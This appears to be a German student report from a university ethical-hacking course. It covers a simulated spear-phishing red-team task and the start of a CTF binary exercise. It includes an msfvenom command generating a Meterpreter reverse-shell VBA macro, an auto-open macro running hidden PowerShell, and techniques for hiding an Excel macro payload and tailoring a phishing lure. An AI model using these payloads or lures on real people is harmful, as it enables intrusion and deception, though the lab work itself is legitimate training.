# Whitehat Hacking 3


## Aufgabe 1 

Als Sie in der Früh ins Büro kommen ersucht Sie Ihre Kollegin Beate gleich ins Besprechungszimmer zu kommen. Dort erfahren Sie, dass die Forensik Abteilung bei Ihrer Untersuchung eines Sicherheitsvorfalls bei einem Ihrer wichtigsten Kunden festgestellt hat, dass die bislang unbekannte APT Gruppe „No Regerts“ offenbar über einen Social Engineering Angriff Zugriff auf das System erhielt. Der Kunde hat daraufhin sofort Ihr Red Team beauftragt die User Awareness und Sicherheit im Hinblick auf Social Engineering Angriffe und die vorhandenen Gegenmaßnahmen zu testen. Das Ziel des Red Teams ist es eine mehrstufige, möglichst ausgeklügelte und überzeugende Spear Phishing Kampagne auf Executive Mitarbeiter zu starten. Das Ziel gilt als erreicht, sobald es dem Team gelingt eine Bind Shell auf einem full patched Windows 10 Rechner mit eingeschaltetem AMSI zu starten und sich damit zu verbinden. 

### Interpretation der Aufgabenstellung  

Erstellen eines Office Dokuments mit eingebetteten Macro, welches einen Tunnel zum System des "Hackers" aufbaut. Das Dokument muss eine "glaubhafte" Geschichte erzaehlen.

### Setup

Es werden eine Kali 20.04 VM und eine Windows 10 x32 basierend auf einer KVM Umgebung verwendet.


### Erste Versuche

Der erste Versuch war die Erstellung eines Word Dokuments vom Typ "docm", welches Makros beinhalten kann. Diesem wird eine mit dem Venom Plugin des Metasploit-Frameworks erstellt. Folgende Befehle wurden im ersten Versuch benutzt:

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.224 LPORT=1337 -e x86/shikata_ga_nai -f vba-psh > macro.txt

Dabei hat der Windows defender hier seine Arbeit sehr gut gemacht und das Makro sofort beim Speichern als Schadhaft erkannt.

![firstFail](ue1/pics/firstTryDefender.png)

Anscheinend muss die Payload hier besser codiert werden. Um die Payload besser zu verstehen und etwas tiefer in die Materie einzusteigen wurden der obige Befehl ohne die Encryption erstellt um die Funktionen lesen zu koennen.


    Sub rIriDKgfEv()
      Dim e6anPeao
      e6anPeao = "powershell.exe -nop -w hidden -e <encrypted payload for opening a reverse tunnel to the LHOST"
     Call Shell(e6anPeao, vbHide)
    End Sub
    Sub AutoOpen()
      rIriDKgfEv
    End Sub
    Sub Workbook_Open()
      rIriDKgfEv
    End Sub

Hier faellt sofort auf, dass "Workbook_Open()" nicht in Word implementiert ist. 

### Undokumentiertes Innuendo

Die Methode der aus der Volesung wird anscheinend vom Windows Defender sofort erkannt.

### Versuch mit Excel

Der Plan ist mit dem Tool "EXCELentDonut" [^1] eine hidden Payload in Excel zu verpacken. Diese Payload ist eine mit MSFVENOM generierte Payload, welches in dem von EXCELentDonut mitgeliefertem Template eingefuegt wurde.

[^1]: https://github.com/FortyNorthSecurity/EXCELntDonut

Das Template verwendet Process Injection um die Payload auszufuehren.

![excelPayload](ue1/pics/excelPayload.png)

Nun wird der von dem Tool erstellte Text in die Zwischenablage kopiert und ueber einen Rechtsclick in einem Excel Workbook auf dem Zielsystem auf "Sheet1" der Text als Macro eingefuegt.


![createMacro](ue1/pics/insertMacro.png)

Auf der Angreifermaschine wurde die Meterpretersession gestartet und als erster Test das Makro auf dem Zielrechner ausgefuehrt.

Nachdem der Fehler mit der Payload fuer die Falsche Architektur (x64 vs x86) behoben wurde, startete das Makro auch sofort die Meterpreter session.


![testErfolg](ue1/pics/meterpreterTestOpen.png)

![testIP](ue1/pics/meterpreterTestIP.png)

### Making it Stealthy

Da wir nun Wissen, dass unsere Prosess Injcetion funktioniert, muessen wir nun das Excel Wokrbookt "herrichten"

Als ersters wird die Zelle A1 im Macro Sheet auf "AutoOpen" umbenannt. Das hat den gleichen Effekt wie eine AutoOpen Funktion in VBA-Macros und so wird unsere Routine beim Start ausgefuehrt. Anschliesend "Verstecken" wir das Makro Worksheet und fuellen das Sichtbare Worksheet mit Dummydaten, welche zu unserer Geschichte Passen. Es sei zu erwaehnen, dass es in Excel fuer ein Worksheet den Status "hidden" und "very hidden" geben kann. Der hidden-Status kann ueber die GUI erreicht werden, wohingegen "very hidden" nur durch aendern eines bestimmten Bytes mittels einens Hex-Editors erzielt wird.

Da dies eine Spear-Phishing Kampagne simuliert, wird hier davon ausgegangen, dass durch OSINT-Methoden Informationen ueber das Berufs- und Privatleben der Zielperson erlangt worden sind.

Laut LinkedIn und einigen Posts auf Social Media ist die Zielperson daran sich mit einem Berufsbegleitendem Studium am Technikum Wien Ihr Wissen zu erweitern. Daher wird auf die Zielperson angepasst eine Phishing-Mail mit dem Titel: " Streng Vertraulich: Jaehrliche Abrechnung zum Unkostenbeitrag" geschickt, welche das zuvor praeparierte Excel File angehaengt hat.

Das Ziel bekommt nun folgende OBerflaeche nach dem Oeffnen des Documents.

![ENABLE](ue1/pics/enableContent.png)

Die Zielperson muss im Body der Mail auf ein (in unserem Fall nicht vorhandenes) Macro Hingewiesen werden, welches weitere Inhalte Freischaltet. Man kann hier noch ein legitimes Makro zusaetzlich einbauen, um das Excel-File noch unauffaelliger wirken zu lassen. Fuer unseren Fall haben wir ab dem Click auf den "Enable Content" Button schon gewonnen. Weiters ist unten zu sehen, dass das Makro Sheet nicht sichtbar ist. Dies koennte jedoch mit einem Rechtsclick auf Sheet1 wieder eingeblendet werden. (Was mit dem oben erwaehnten "very hidden" nicht der Fall waere)

Nach dem Oeffnen und dem Content Enablen erhalten wir die 2. Session. Die erste ist nicht mehr aktiv, da inzwischen neu gestartet wurde.


![works1](ue1/pics/works-final.png)


## Aufgabe 4

Nachdem man sich mit dem FH-VPN Verbunden hat, kann man sich mit der Zieladresse verbinden. Der Broswer zeigt kurz die Webseite an gibt dann aber ein "Verbindung unterbrochen". Mit ncat kann man sich verbinden, aber nach dem Eingeben eines Accounts passiert nichts. Daher wird erstmal die IP-Gescanned um Informationen zum darunterliegenden System zu erhalten.

![initscan](ue4/pics/initScan.png)

Hierzu wurde aufgrund der Windows Testumgebung Zenmap benutzt. Als Flags sind die Standard "-sV" zum finden der offenen Ports und "-O" zur OS-Detection uebergeben.

Das Ergbnis zeigt und den http-Service und einen offenen SSH-Port.

Das System basiert anscheinend auf Debian Stretch.

![os](ue4/pics/OSsha.png)


Nachdem es auf den ersten Blick keine interessante Schwachstelle gibt wurden die gelieferten "USB-Stick Files" untersucht.

"strings" verraet, dass das Binary mit GLIBC 2.0 compiliert worden ist und es gibt uns auch schon die Verfuegbaren Funktionen zurueck.

Ein Ausfuehren der Binary ist erfolglos, da eine library Fehlt. 

### Binary Compile

Da die fehlende Library eine Customlibrary ist, kann diese nicht einfach installiert werden. Die Vermutung legt nahe, dass einige der zuvor gesehenen Funktionen in dieser definiert sind. Um herauszufinden welche genau benoetigt werden wird eine leere library erstellt und mit gcc compiliert.

Wie erwartet werden uns fehlende Funktionsdefinitionen angezeigt

![missingFunctions](ue4/pics/missingFunctions.png)

Die Library wird mit prototypen gefuellt. Nach einem erneutem Kompilieren werden die refrenzen erkannt, aber die implementierung Fehlt. 

![missingFunctions](ue4/pics/undefinedFunc.png)

Um nun erfolgreich compilieren zu koennen muss die Notwendige libinetsec.o erstellt werden. Diese wird mit den Funktionen befuellt, wobei die Funktionen keine Funktion haben.

	#include "libinetsec.h"

	void init_canary(byte *canary, char *user, char *pass){}

	book check_canary(byt *canary1, byte *canary2){return 1;}

	int auth_user(char *user, char * pass){return 1;}

	book check_user(char *user, char *pass){return 1;}

Es wird erneut Kompiliert. hierzu wurde nach einigen errors ohne Flags, das GCC Manual und Dr.Google befragt. 

Folgende parameter wurden zum kompilieren verwendet:

-fPIC : Position Independet Code (benoetigt fuer die Sharded-Library

-shared : um eine Shared Library zu erstellen. 

Der ganze Befehl wurde so ausgefuehrt:

	$ gcc -c -fPIC -o libinetsec.o libinetsec.c
	$ gcc -shared -o libinetsec.so libinetsec.o

Beim Versuch das pokerROP binary nun auszufuehren kam folgende Fehlermeldung.

	./pokerROP: error while loading shared libraries: libinetsec.so: wrong ELF class: ELFCLAS

Dies wies auf eine falsche Architektur der kompilierten binary hin. Es musste sowohl die gcc-Multilib zum Crosscompilen nachinstalliert, als auch das "-m32" Flag beim Kompiliervorgang hinzugefuegt werden um erfolgreich auf einem x64 System eine x86 Binary zu kompilieren.

Leider beendete sich die Binary sofort mit einem Segmentation fault.
